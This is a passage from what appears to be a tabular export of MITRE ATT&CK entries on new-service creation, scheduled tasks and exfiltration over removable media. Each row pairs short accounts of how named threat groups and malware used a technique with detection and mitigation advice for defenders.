2017]][[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
969,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0013|PlugX]] can be added as a service to establish persistence.[[CiteRef::Lastline PlugX Analysis]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::FireEye APT10 April 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
970,['Monitor file access on removable media. Detect processes that execute when removable media are mounted.'],[],[],[],"['Data loss prevention', 'File monitoring']",['[[Software/S0125|Remsec]] contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.[[CiteRef::Kaspersky ProjectSauron Full Report]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if they are not required for business operations.[[CiteRef::TechNet Removable Media Control]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Presence of physical medium or device'],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Exfiltration'],['Technique/T1052'],['Exfiltration Over Physical Medium'],https://attack.mitre.org/wiki/Technique/T1052
971,['Monitor file access on removable media. Detect processes that execute when removable media are mounted.'],[],[],[],"['Data loss prevention', 'File monitoring']",['[[Software/S0136|USBStealer]] exfiltrates collected files via removable media from air-gapped victims.[[CiteRef::ESET Sednit USBStealer 2014]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if they are not required for business operations.[[CiteRef::TechNet Removable Media Control]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Presence of physical medium or device'],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Exfiltration'],['Technique/T1052'],['Exfiltration Over Physical Medium'],https://attack.mitre.org/wiki/Technique/T1052
972,['Monitor file access on removable media. Detect processes that execute when removable media are mounted.'],[],[],[],"['Data loss prevention', 'File monitoring']",['[[Software/S0035|SPACESHIP]] copies staged data to removable drives when they are inserted into the system.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if they are not required for business operations.[[CiteRef::TechNet Removable Media Control]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Presence of physical medium or device'],Software: SPACESHIP,['Exfiltration'],['Technique/T1052'],['Exfiltration Over Physical Medium'],https://attack.mitre.org/wiki/Technique/T1052
973,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0046|FIN7]] malware has created scheduled tasks to establish persistence.[[CiteRef::FireEye FIN7 April 2017]][[CiteRef::Morphisec FIN7 June 2017]]'],['FIN7'],['FIN7'],['G0046'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
974,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0147|Pteranodon]] schedules tasks to invoke its components in order to establish persistence.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Pteranodon,"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
975,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0026|APT18]] actors used the native [[Software/S0110|at]] Windows task scheduler tool to use scheduled tasks for execution on a victim network.[[CiteRef::Dell Lateral Movement]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
976,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0125|Remsec]] schedules the execution one of its modules by creating a new scheduler task.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: Remsec, Backdoor.Remsec, ProjectSauron","['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
977,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0044|JHUHUGIT]] has registered itself as a scheduled task to run each time the current user logs in.[[CiteRef::ESET Sednit Part 1]][[CiteRef::ESET Sednit July 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: JHUHUGIT, Seduploader, ...","['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
978,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0148|RTM]] tries to add a scheduled task to establish persistence.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: RTM,"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
979,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",[u'[[Group/G0038|Stealth Falcon]] malware creates a scheduled task entitled \u201cIE Web Cache\u201d to execute a malicious file hourly.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]'],['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
980,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0051|FIN10]] has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.[[CiteRef::FireEye FIN10 June 2017]][[CiteRef::Github PowerShell Empire]]'],['FIN10'],['FIN10'],['G0051'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
981,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0050|APT32]] has used scheduled tasks to persist on victim systems.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
982,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0037|FIN6]] has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and PoS malware known as TRINITY.[[CiteRef::FireEye FIN6 April 2016]]']",['FIN6'],['FIN6'],['G0037'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using 